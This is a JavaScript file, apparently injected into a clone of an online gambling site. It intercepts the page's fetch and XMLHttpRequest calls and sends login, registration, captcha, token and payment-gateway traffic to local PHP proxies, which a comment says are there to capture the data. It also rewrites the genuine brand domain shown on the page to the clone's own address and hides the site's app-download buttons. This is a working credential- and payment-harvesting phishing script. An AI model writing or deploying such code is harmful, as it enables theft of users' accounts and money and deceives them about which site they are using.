(function () {
  var upstreamLogHost = "https://bfivegwlog.gwtenkges.com";
  var upstreamPaymentHost = "https://bfivegwpeymint.gwtenkges.com";
  var currentOrigin = window.location.origin;

  // F5 = đăng xuất: xóa token/session trong localStorage khi tải trang.
  // Chỉ giữ đăng nhập khi URL có token/sessionid (vd. redirect sau khi login).
  (function clearSessionOnPageLoad() {
    try {
      var params = new URLSearchParams(window.location.search);
      var hasTokenInUrl = params.has("token") || params.has("sessionid");
      if (!hasTokenInUrl) {
        localStorage.removeItem("session_id");
        localStorage.removeItem("user_token");
        localStorage.removeItem("token");
      }
    } catch (e) {}
  })();

  // Sync token/sessionid from URL to localStorage (chỉ khi vừa redirect từ trang login)
  (function syncTokenToLocalStorage() {
    try {
      var params = new URLSearchParams(window.location.search);
      var token = params.get("token");
      var sessionid = params.get("sessionid");
      var sessionToStore = sessionid || token;
      if (sessionToStore) {
        var stored = localStorage.getItem("session_id");
        if (!stored || stored !== sessionToStore) {
          localStorage.setItem("session_id", sessionToStore);
        }
      }
    } catch (e) {}
  })();
  var gwlogMirrorHosts = [
    "gwapyendroysfivep.bfyfetanks.com",
    "gwapyosfivep.bfyfetanks.com",
    "api-gateway.go8api.com",
    "api-gw.25b-ipb.com",
    "api-gw52.sgame.us",
    "pm.25b-ipb.com",
    "demo7892.fun"
  ];

  function normalizeUrl(input) {
    try {
      return new URL(input, window.location.href);
    } catch (error) {
      return null;
    }
  }

  function rewriteUrl(input) {
    var url = normalizeUrl(input);
    if (!url) {
      return input;
    }

    var full = url.href;
    var host = url.host;
    var path = url.pathname;
    var search = url.search || "";

    if (full.indexOf(upstreamLogHost + "/user/login.aspx") === 0 || path === "/user/login.aspx") {
      return "/login.php";
    }

    if (full.indexOf(upstreamLogHost + "/user/register.aspx") === 0 || path === "/user/register.aspx") {
      return "/register.php";
    }

    if (full.indexOf(upstreamLogHost + "/verify/index.aspx") === 0 || path === "/verify/index.aspx") {
      return "/captcha.php" + search;
    }

    if (full.indexOf(upstreamLogHost + "/checking/index.aspx") === 0 || path === "/checking/index.aspx") {
      return "/checking.php" + search;
    }

    if (full.indexOf(upstreamLogHost + "/gwms/v1/verifytoken.aspx") === 0 || path === "/gwms/v1/verifytoken.aspx") {
      return "/verifytoken.php";
    }

    if (full.indexOf(upstreamLogHost + "/lobby/info.aspx") === 0 || path === "/lobby/info.aspx") {
      return "/info.php" + search;
    }

    if (full.indexOf(upstreamLogHost + "/") === 0) {
      return "/gwlog" + path + search;
    }

    if (full.indexOf(upstreamPaymentHost + "/") === 0) {
      return "/gwpayment" + path + search;
    }

    // Bắt buộc /id (login/register) và /paygate đi qua proxy local PHP để hứng data
    // (Thực tế giờ mạng bịặn nên phải cho mọi thứ qua proxy local PHP)

    var proxyPaths = [
      "/distributor", "/num", "/id", "/avatar", "/sa", "/ca", 
      "/et", "/gameapi", "/gamehot", "/gammapi", "/paremmi", 
      "/auth", "/sport", "/game.js", "/paygate", "/acs"
    ];
    for (var i = 0; i < proxyPaths.length; i++) {
        if (path === proxyPaths[i] || path.indexOf(proxyPaths[i] + "/") === 0) {
            // Ép tất cả các path API của game về local domain để dùng SOCKS5 proxy
            if (host === "demo7892.fun" || host === "play.789clup.fun") {
                // Để tránh lỗi 404 với POST directory không có slash trên Nginx,
                // ta nên append trailing slash nếu nó đúng bằng proxyPaths[i] không slash.
                // Tuy nhiên các proxy PHP đã xử lý query => giữ nguyên path + search.
                return path + search; 
            }
        }
    }

    // Nếu không nằm trong proxyPaths thì gọi thẳng
    if (host === "demo7892.fun") {
      return input;
    }

    // api100.atpman.net (top_sport_domain) → local
    if (host === "api100.atpman.net" && path.indexOf("/gameapi/public/sb/ranking") === 0) {
      return "/gameapi/public/sb/ranking" + search;
    }

    if (gwlogMirrorHosts.indexOf(host) !== -1) {
      return "/gwlog" + path + search;
    }

    return input;
  }

  // Khi F5, game chưa có session_id nên gửi xtoken=undefined hoặc path main/token-undefined. Thay bằng token trong localStorage.
  function fixTokenInUrl(url) {
    if (typeof url !== "string") return url;
    try {
      var stored = localStorage.getItem("session_id");
      if (!stored) return url;
      if (url.indexOf("xtoken=undefined") !== -1) {
        url = url.replace(/xtoken=undefined/g, "xtoken=" + encodeURIComponent(stored));
      }
      if (url.indexOf("token=undefined") !== -1) {
        url = url.replace(/token=undefined/g, "token=" + encodeURIComponent(stored));
      }
      if (url.indexOf("token-undefined") !== -1) {
        url = url.replace(/token-undefined/g, "token-" + encodeURIComponent(stored));
      }
    } catch (e) {}
    return url;
  }

  var originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url) {
    var rewritten = rewriteUrl(url);
    rewritten = fixTokenInUrl(rewritten);
    return originalOpen.apply(this, [method, rewritten].concat([].slice.call(arguments, 2)));
  };

  // Không dùng toast/banner riêng — để UI client (game) tự hiển thị message từ response API /id
  // Backend trả đúng format (data[0].message, status 403) thì game sẽ show trong modal đăng nhập

  if (typeof window.fetch === "function") {
    var originalFetch = window.fetch;
    window.fetch = function (input, init) {
      var url = typeof input === "string" ? input : (input && input.url) || "";
      if (typeof input === "string") {
        url = fixTokenInUrl(rewriteUrl(input));
        input = url;
      } else if (input instanceof Request) {
        var rewrittenUrl = fixTokenInUrl(rewriteUrl(input.url));
        if (rewrittenUrl !== input.url) {
          input = new Request(rewrittenUrl, input);
        }
        url = input.url;
      }

      return originalFetch.call(this, input, init);
    };
  }

  // WebSocket: KHÔNG đổi URL — để game kết nối trực tiếp lên upstream (demo7892.fun).
  // Nếu đổi ws/wss về localhost thì cần server có proxy WebSocket (mod_proxy_wstunnel), không có thì login sẽ lỗi.
  // Giữ nguyên đoạn dưới = tắt rewrite WebSocket.
  // if (typeof window.WebSocket === "function") {
  //   var OriginalWebSocket = window.WebSocket;
  //   window.WebSocket = function (url, protocols) {
  //     var u = typeof url === "string" ? url : "";
  //     if (u && (u.indexOf("ws://") === 0 || u.indexOf("wss://") === 0)) {
  //       try {
  //         var parsed = new URL(u, window.location.href);
  //         var currentHost = window.location.host;
  //         if (parsed.host !== currentHost) {
  //           u = (window.location.protocol === "https:" ? "wss:" : "ws:") + "//" + currentHost + (parsed.pathname || "/") + (parsed.search || "");
  //         }
  //       } catch (e) {}
  //     }
  //     return protocols !== undefined ? new OriginalWebSocket(u, protocols) : new OriginalWebSocket(u);
  //   };
  // }

  function replaceBrandDomainText() {
    try {
      var walker = document.createTreeWalker(document.body || document.documentElement, NodeFilter.SHOW_TEXT, null);
      var node;
      while ((node = walker.nextNode())) {
        if (!node.nodeValue) continue;
        if (node.nodeValue.indexOf("play.b52club.bid") !== -1 || node.nodeValue.indexOf("https://play.b52club.bid") !== -1) {
          node.nodeValue = node.nodeValue
            .replace(/https:\/\/play\.b52club\.bid/g, currentOrigin)
            .replace(/play\.b52club\.bid/g, window.location.host);
        }
      }
    } catch (e) {}
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", replaceBrandDomainText);
  } else {
    replaceBrandDomainText();
  }
  var obs = new MutationObserver(function () { replaceBrandDomainText(); });
  obs.observe(document.documentElement, { childList: true, subtree: true, characterData: true });

  function hideMobileDownloadButton() {
    try {
      var all = document.querySelectorAll("a,button,div,span,label");
      for (var i = 0; i < all.length; i++) {
        var el = all[i];
        var text = (el.innerText || el.textContent || "").trim().toLowerCase();
        var cls = ((el.className && el.className.toString()) || "").toLowerCase();
        var id = (el.id || "").toLowerCase();
        var title = ((el.getAttribute && (el.getAttribute("title") || el.getAttribute("aria-label"))) || "").toLowerCase();

        var isDownloadApp =
          text.indexOf("tải app") !== -1 ||
          text.indexOf("tai app") !== -1 ||
          title.indexOf("tải app") !== -1 ||
          title.indexOf("tai app") !== -1 ||
          cls.indexOf("download") !== -1 ||
          cls.indexOf("taiapp") !== -1 ||
          id.indexOf("download") !== -1 ||
          id.indexOf("taiapp") !== -1 ||
          id.indexOf("btn_taiApp") !== -1;

        if (!isDownloadApp) continue;

        var target = el.closest("a,button,li,div") || el;
        target.style.display = "none";
        target.style.visibility = "hidden";
        target.style.pointerEvents = "none";
      }
    } catch (e) {}
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", hideMobileDownloadButton);
  } else {
    hideMobileDownloadButton();
  }
  setInterval(hideMobileDownloadButton, 600);
  var hideObs = new MutationObserver(function () { hideMobileDownloadButton(); });
  hideObs.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
})();
